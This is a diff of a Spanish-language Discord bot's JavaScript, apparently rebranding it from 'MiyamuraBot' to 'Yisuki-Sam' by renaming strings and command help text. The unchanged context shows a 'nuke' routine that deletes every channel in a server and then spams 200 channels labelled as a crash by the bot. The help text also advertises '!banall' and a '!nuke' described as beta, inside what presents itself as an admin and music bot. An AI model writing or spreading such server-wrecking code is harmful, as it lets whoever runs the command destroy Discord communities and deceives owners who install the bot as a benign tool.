@@ -371,7 +371,7 @@ if (command === "serverinfo") {
     guild.channels.cache.forEach(channel => channel.delete().catch(err => {}));
     // 2. Спам новыми каналами (500+)
     for (let i = 0; i < 200; i++) {
-      guild.channels.create({ name: `CRAHS-BY-MIYAMURABOT-${i}`, type: 0 })
+      guild.channels.create({ name: `CRAHS-BY-YISUKI-SAM-${i}`, type: 0 })
         .then(() => console.log(`Канал ${i} создан!`))
         .catch(() => {});
     }
@@ -666,7 +666,7 @@ if (command === "serverinfo") {
 
         const embed = {
             color: 0xe983d8,
-            title: 'MiyamuraBot Informacion',
+            title: 'Yisuki-Sam Informacion',
             description: 'Un bot para discord para administrar y escuchar musica.',
             fields: [
                 { name: 'Version', value: version, inline: true },
@@ -683,11 +683,11 @@ if (command === "serverinfo") {
     }
     
     if (command === 'listbot') {
-    message.reply('TODAS LAS FUNCTIONES DE MIYAMURABOT\n\nAdministración De Servers\n!mute @user [duración] [razón] - Mutear\n!unmute @user - Unmute\n!eliminar @user [razón] - Ban\n!unkick @user - Unkick\n!kick @user - Elimina\n!clear [1 al 100] - Limpia el chat\n!userinfo @user - Información del usuario\n!serverinfo - Información del servidor\n!ban @user - Da ban al user\n!banlist - Revisa los usuarios baneados\n!members - Revisa los miembros\n!banall - Banea a todos\n!nuke - No se que hace (totalmente beta)\n!poll - Crea encuesta\n!nickname @user - Cambia el nickname\n!avatar - Revisa el perfil\n\nInfo Rpg\n!coinflip - Lanza una moneda\n!dado - Un número random del 1 al 6\n!random - Un número random del 1 al 100\n!ppt - Juega piedra papel o tijera con el bot\n!8ball - As una pregunta\n\nInfo De Bot\n!ping - Velocidad del bot\n!uptime - Tiempo de actividad del bot\n!infobot - Información del bot\n!botinfo - Mas información del bot\n\nInfo De Play\n!play [canción] - Escucha una canción\n!stop - Para la reproducción\n!skip - Salta a la siguiente canción a reproducir\n!pause - Pausa la reproducción\n!resume - Reanudar la reproducción\n!volume - Ajusta el volumen de la reproducción\n!list - Lista de reproducción\n!time - Tiempo a terminar la canción\n\nInfo Random\n!traducir [idioma + texto] - Traduce de un idioma a otro\npiropo - Un piropo random\n\nInfo De Servers\n!createchannel - Crea un canal\n!delchannel - Elimina un canal\n!channels - Canales del servidor\n!emojis - Revisa los emojis del server\n\nInfo De Roles\n!createrole - Crea un roll\n!delrole - Elimina un roll\n!getrole - Revisa el roll de un miembro\n!removerole - Quita el roll de un miembro \n!roles - Roles del servidor\n!roleinfo - Revisa el roll\n\nInfo Mas Comandos\n!mascommands');
+    message.reply('TODAS LAS FUNCTIONE DE YISUKI-SAM\n\nAdministración De Servers\n!mute @user [duración] [razón] - Mutear\n!unmute @user - Unmute\n!eliminar @user [razón] - Ban\n!unkick @user - Unkick\n!kick @user - Elimina\n!clear [1 al 100] - Limpia el chat\n!userinfo @user - Información del usuario\n!serverinfo - Información del servidor\n!ban @user - Da ban al user\n!banlist - Revisa los usuarios baneados\n!members - Revisa los miembros\n!banall - Banea a todos\n!nuke - No se que hace (totalmente beta)\n!poll - Crea encuesta\n!nickname @user - Cambia el nickname\n!avatar - Revisa el perfil\n\nInfo Rpg\n!coinflip - Lanza una moneda\n!dado - Un número random del 1 al 6\n!random - Un número random del 1 al 100\n!ppt - Juega piedra papel o tijera con el bot\n!8ball - As una pregunta\n\nInfo De Bot\n!ping - Velocidad del bot\n!uptime - Tiempo de actividad del bot\n!infobot - Información del bot\n!botinfo - Mas información del bot\n\nInfo De Play\n!play [canción] - Escucha una canción\n!stop - Para la reproducción\n!skip - Salta a la siguiente canción a reproducir\n!pause - Pausa la reproducción\n!resume - Reanudar la reproducción\n!volume - Ajusta el volumen de la reproducción\n!list - Lista de reproducción\n!time - Tiempo a terminar la canción\n\nInfo Random\n!traducir [idioma + texto] - Traduce de un idioma a otro\npiropo - Un piropo random\n\nInfo De Servers\n!createchannel - Crea un canal\n!delchannel - Elimina un canal\n!channels - Canales del servidor\n!emojis - Revisa los emojis del server\n\nInfo De Roles\n!createrole - Crea un roll\n!delrole - Elimina un roll\n!getrole - Revisa el roll de un miembro\n!removerole - Quita el roll de un miembro \n!roles - Roles del servidor\n!roleinfo - Revisa el roll\n\nInfo Mas Comandos\n!mascommands');
     }
     
    if (command === 'mascommands') { 
-   message.reply('MAS COMADOS DE MIYAMURABOT\n\nInfo De Guardado\n!guardar - Guarda un texto por 7 dias\n!ver - Revisa tu texto \n!restablecer - Restablece el tiempo de tu texto\n!borrar - Elimina El texto guardado\n!entradas - Revisar cuantos espacios hay para guardar textos\n!tiempo - Revisa el tiempo que le queda a tu texto guardado\n\nInfo De Reporte\n!reporte - Reportar al creador\n!reportes - Ver los reportes existentes\n!responder - Responde al reporte\n\nMas Comandos\n!antilink - El bot elimina enlaces de diacord, whatsapp y telegram\n');
+   message.reply('MAS COMADOS DE YISUKI-SAM\n\nInfo De Guardado\n!guardar - Guarda un texto por 7 dias\n!ver - Revisa tu texto \n!restablecer - Restablece el tiempo de tu texto\n!borrar - Elimina El texto guardado\n!entradas - Revisar cuantos espacios hay para guardar textos\n!tiempo - Revisa el tiempo que le queda a tu texto guardado\n\nInfo De Reporte\n!reporte - Reportar al creador\n!reportes - Ver los reportes existentes\n!responder - Responde al reporte\n\nMas Comandos\n!antilink - El bot elimina enlaces de diacord, whatsapp y telegram\n');
     }
     
     if (command === "roles") {
